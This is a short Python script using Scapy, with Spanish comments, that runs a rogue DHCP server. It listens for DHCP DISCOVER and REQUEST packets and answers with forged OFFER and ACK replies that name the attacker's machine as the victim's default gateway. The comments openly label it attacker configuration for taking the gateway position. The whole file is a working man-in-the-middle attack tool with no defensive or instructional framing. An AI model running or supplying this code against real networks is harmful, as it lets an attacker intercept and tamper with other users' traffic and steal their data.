from scapy.all import sniff, Ether, IP, UDP, BOOTP, DHCP, sendp

# CONFIGURACIÓN DEL ATACANTE
INTERFACE = "eth0"
ATTACKER_MAC = "02:00:11:22:33:44"
FAKE_SERVER_IP = "192.168.1.254"  # Tu IP / Falso Gateway
VICTIM_ASSIGNED_IP = "192.168.1.150"
NETMASK = "255.255.255.0"
DNS_SERVER = "8.8.8.8"

def procesar_dhcp(paquete):
    if not paquete.haslayer(DHCP):
        return

    tipo_mensaje = paquete[DHCP].options[0][1]
    mac_cliente = paquete[Ether].src
    xid_transaccion = paquete[BOOTP].xid
    chaddr_cliente = paquete[BOOTP].chaddr

    # 1. SI ES UN DHCP DISCOVER -> RESPONDEMOS CON DHCP OFFER
    if tipo_mensaje == 1:
        print(f"[+] DISCOVER detectado desde MAC: {mac_cliente}. Enviando Fake OFFER...")
        
        falsa_oferta = (
            Ether(src=ATTACKER_MAC, dst=mac_cliente) /
            IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, xid=xid_transaccion, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP, chaddr=chaddr_cliente) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", FAKE_SERVER_IP),
                ("subnet_mask", NETMASK),
                ("router", FAKE_SERVER_IP),  # Nos posicionamos como Gateway
                ("name_server", DNS_SERVER),
                "end"
            ])
        )
        sendp(falsa_oferta, iface=INTERFACE, verbose=False)

    # 2. SI ES UN DHCP REQUEST -> RESPONDEMOS CON DHCP ACK
    elif tipo_mensaje == 3:
        print(f"[+] REQUEST detectado desde MAC: {mac_cliente}. Enviando Fake ACK...")
        
        falso_ack = (
            Ether(src=ATTACKER_MAC, dst=mac_cliente) /
            IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, xid=xid_transaccion, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP, chaddr=chaddr_cliente) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", FAKE_SERVER_IP),
                ("lease_time", 86400),
                ("subnet_mask", NETMASK),
                ("router", FAKE_SERVER_IP),
                ("name_server", DNS_SERVER),
                "end"
            ])
        )
        sendp(falso_ack, iface=INTERFACE, verbose=False)

if __name__ == "__main__":
    print(f"[*] Servidor DHCP falso escuchando activamente en {INTERFACE}...")
    # Escuchamos en el puerto 67 UDP (tráfico destinado a servidores DHCP)
    sniff(filter="udp port 67", prn=procesar_dhcp, iface=INTERFACE, store=0)
    
